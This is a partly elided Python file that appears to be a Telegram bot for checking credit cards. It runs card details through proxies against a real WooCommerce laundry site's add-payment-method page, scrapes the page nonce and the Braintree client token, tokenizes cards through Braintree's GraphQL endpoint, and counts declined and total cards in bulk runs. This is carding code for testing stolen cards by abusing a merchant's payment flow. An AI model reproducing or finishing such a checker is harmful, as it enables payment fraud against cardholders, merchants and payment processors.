...
async def check_cc(cc_details):
    try:
        ...
        proxies_dict = {'http': proxy_url, 'https': proxy_url} if proxy_url and is_proxy_alive else None
        proxy_param = proxies_dict['http'] if proxies_dict else None

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            # Login - aligned with original
            ...
            # Add payment method - aligned with original extraction
            async with session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers, proxy=proxy_param) as r:
                text = await r.text()
                soup = BeautifulSoup(text, 'html.parser')

                # Find add nonce using soup
                add_nonce_elem = soup.find(id="woocommerce-add-payment-method-nonce")
                if not add_nonce_elem or 'value' not in add_nonce_elem.attrs:
                    raise ValueError("Could not find payment nonce")
                add_nonce = add_nonce_elem['value']

                # Get Braintree client token from JS
                token_js_match = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\];', text)
                if not token_js_match:
                    raise ValueError("Could not find Braintree client token")
                b64_token = token_js_match.group(1)

                try:
                    decoded = base64.b64decode(b64_token).decode('utf-8')
                except Exception:
                    raise ValueError("Could not decode client token")
            ...
            # Tokenize card - aligned with original, added billingAddress
            tokenize_headers = {
            ...
            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxy_param) as r:
            ...
            # Add card - aligned with original fields
            headers.update({
        ...
        # Override for CCN if specific message
        ...
        if is_bulk and bulk_id in bulk_progress:
            ...
            async with progress['lock']:
                ...
                progress_text = (
                    ...
                    f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                    f"[💳] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                    f"[💎] 𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲: {last_response_display}"
                )
                keyboard = [
...
async def main():
    try:
        ...
        try:
            ...
            # Properly stop the application and cancel tasks
...
if __name__ == '__main__':
    # Use the existing event loop or create a new one if none exists
